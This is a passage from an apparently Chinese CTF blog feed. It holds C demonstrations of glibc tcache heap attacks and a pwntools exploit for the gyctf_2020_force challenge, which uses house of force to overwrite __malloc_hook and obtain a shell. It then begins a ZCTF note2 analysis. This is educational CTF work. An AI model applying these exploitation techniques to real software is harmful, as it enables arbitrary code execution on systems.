width="12"><p>由于第一个堆块就是<code>stack_var</code>，直接<code>malloc</code>就能得到栈上的控制权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="built_in">malloc</span>(<span class="number">0x90</span>); </span><br></pre></td></tr></table></figure><p><code>gyctf_2020_signin</code>这题差不多就是按照<code>tcache_stashing_unlink_attack</code>改编而成的，感兴趣可以去看看《buu刷题记之PWN系列》，<code>calloc</code>的细节也有提到…</p><h3 id="libc-2-31-so"><a href="#libc-2-31-so" class="headerlink" title="libc-2.31.so"></a>libc-2.31.so</h3><h4 id="tcache-poisoning-1"><a href="#tcache-poisoning-1" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h4><p>和<code>libc-2.27.so</code>一样的，不多说了….</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-house-of-spirit-1"><a href="#tcache-house-of-spirit-1" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>死性不改呀！😂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>写了个寂寞….</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>参考《buu刷题记之PWN系列》</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>​        总的来说，加入<code>tache</code>让堆题的可玩性增加了不少，但利用的手法都不是很复杂，只能说开发者在安全性和效率之间，更偏向于效率，才导致这么多问题出现，以前对<code>tache</code>的题目很恐慌。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记之PWN系列</title>
      <link href="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/"/>
      <url>/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h3><h4 id="0x00-基本信息"><a href="#0x00-基本信息" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/1.png" class=""><p>保护全开，GOT也写不了，看这个名字就感觉是house of force….</p><h4 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/2.png" class=""><p>正好印证了之前的猜测，满足house of force的条件：</p><p>可覆盖Top chunk为-1</p><p>能够分配任意大小的堆块以及分配的次数</p><p>先试一下覆盖Top chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heap_base = add(<span class="number">10</span>,payload)</span><br></pre></td></tr></table></figure><p>没啥毛病！不记得回去看看house of force</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/3.png" class=""><p>接下来就是想着任意地址堆块分配到哪里去了，前面看到保护全开，其实我第一想法是覆盖GOT表的，但是RELOC保护全开了，没办法了！只能覆盖malloc_hook，写one_gadget了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/4.png" class="" width="4"><h4 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><p>1.泄露libc，heap基址</p><p>2.修改Top chunk的size为-1</p><p>3.劫持__malloc_hook修改one_gadget，这里需要realloc改变栈环境</p><h4 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, 26108)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;addr &#x27;</span>)</span><br><span class="line">    heap = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content\n&#x27;</span>, content)</span><br><span class="line">    <span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line">libc_base = new(<span class="number">0x200000</span>, <span class="string">&#x27;aaa&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base : &#x27;</span> + <span class="built_in">hex</span>(libc_base)</span><br><span class="line">heap_base = new(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_base : &#x27;</span> + <span class="built_in">hex</span>(heap_base)</span><br><span class="line">top = heap_base + <span class="number">0x10</span></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">offset = malloc_hook - top</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;offset : &#x27;</span> + <span class="built_in">hex</span>(offset)</span><br><span class="line">realloc = libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf0274</span>, <span class="number">0xf1117</span>]</span><br><span class="line">one = onegadget[<span class="number">1</span>] + libc_base</span><br><span class="line">new(offset - <span class="number">0x33</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(one) + p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><h5 id="1-libc基址的获取"><a href="#1-libc基址的获取" class="headerlink" title="1.libc基址的获取"></a>1.libc基址的获取</h5><p>我们通过IDA看到，当成功分配一个堆块的时候，会将此堆块的地址打印出来，那么当堆块size过大的时候，它会通过mmap来分配堆块，此堆块的分配会紧挨着libc，就能利用输出的堆地址计算libc地址</p><h5 id="2-realloc平衡原理"><a href="#2-realloc平衡原理" class="headerlink" title="2.realloc平衡原理"></a>2.realloc平衡原理</h5><p>我们在劫持完__malloc_hook修改成one_gadget的时候，发现四个one_gadget都不能getshell，那么可以考虑通过realloc来平衡栈，实现one_gadget，下图我们可以看到除了第一个one_gadget的条件是rax的值为NULL，其他的都是栈上的某一个位置的值为NULL，所以用realloc来平衡栈就可以getshell了！！</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/12.png" class=""><p>我们知道啊，当进行malloc的时候呢，是先判断__malloc_hook的值是否为空，如果不为空就跳到这个值的地址上去，那么我们填上realloc的地址，就可以跳到realloc上去</p><p>realloc之所以能够调整栈帧，是因为进入realloc函数之后会push一系列的参数进去，接着和__malloc_hook一样，判断realloc_hook是否为空，不为空就跳转进去执行，需要注意的是要控制好psuh参数的个数，也就是加上一定的偏移</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/13.jpg" class=""><p>所以执行流程是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc —&gt; __malloc_hook —&gt; realloc —&gt; __realloc_hook —&gt; one_gadget --&gt;getshell</span><br></pre></td></tr></table></figure><p>实际的操作中还是去试偏移会快一点….</p><h3 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h3><h4 id="0x00-基本信息-1"><a href="#0x00-基本信息-1" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/5.png" class=""><p>可以写GOT表…</p><h4 id="0x01-IDA分析-1"><a href="#0x01-IDA分析-1" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/6.png" class=""><p>经典菜单题，一个函数一个函数看吧！</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/image-20210818154940988.png" class=""><p>分配note的数量限制在4个以内，大小限制为0x80以内，但是需要注意的是它没有限制堆块的大小不为0，接下来就是读入content</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/7.png" class=""><p>刚刚说到它没有限制堆块大小为0，那么当size也就是a2为0的时候，a2 - 1 = -1，与无符号变量i进行对比的时候，-1将转化成最大的无符号数，那么就可以实现溢出了</p><p>除此之外，程序还维护了一张堆块的信息表，一看到这第一反应肯定是劫持这个堆块表</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/8.png" class=""><h5 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/9.png" class=""><p>没啥毛病，在ptr中有记录此堆块的内容指针，就打印出来</p><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h5><img 